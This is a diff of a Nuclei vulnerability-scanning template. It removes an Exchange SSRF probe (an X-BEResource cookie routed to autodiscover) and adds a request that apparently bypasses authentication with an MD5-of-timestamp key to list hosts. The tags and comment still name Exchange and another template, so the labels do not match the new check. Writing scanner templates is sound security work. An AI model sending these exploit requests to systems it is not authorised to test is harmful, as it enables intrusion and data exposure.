@@ -11,24 +11,21 @@ info:
   tags: web,go,microsoft,exchange,outlook
 
 # nuclei -duc -u http://localhost:9999 -t ./51pwn/checkGoDebug.yaml
+variables:
+  TimeNow: '{{unix_time(10)}}'
 
 requests:
   - raw:
       - |+
-        POST /ecp/target.js HTTP/1.1
+        POST /index/hostlist HTTP/1.1
         Host: {{Host}}
         Accept-Encoding: gzip, deflate
         Accept: */*
         Connection: close
-        Cookie: X-BEResource=[name]@{{Host}}/autodiscover/autodiscover.xml?#~1941962754
-        Content-Type: text/xml
+        X-Requested-With: XMLHttpRequest
+        Content-Type: application/x-www-form-urlencoded
 
-        <Autodiscover xmlns="http://schemas.microsoft.com/exchange/autodiscover/outlook/requestschema/2006">
-        <Request>
-        <EMailAddress>administrator@saucerman.com</EMailAddress>
-        <AcceptableResponseSchema>http://schemas.microsoft.com/exchange/autodiscover/outlook/responseschema/2006a</AcceptableResponseSchema>
-        </Request>
-        </Autodiscover>
+        auth_key={{md5(TimeNow)}}&timestamp={{TimeNow}}&offset=0&limit=10&search=
         
       # end payload
     unsafe: true
@@ -37,8 +34,12 @@ requests:
     stop-at-first-match: true
     matchers-condition: and
     matchers:
+      - type: status
+        status:
+          - 200
       - type: word
         part: body
         words:
-          - 'Organization/ou=Exchange Administrative Group'
+          - '"rows":'
+          - 'total":'
         condition: and
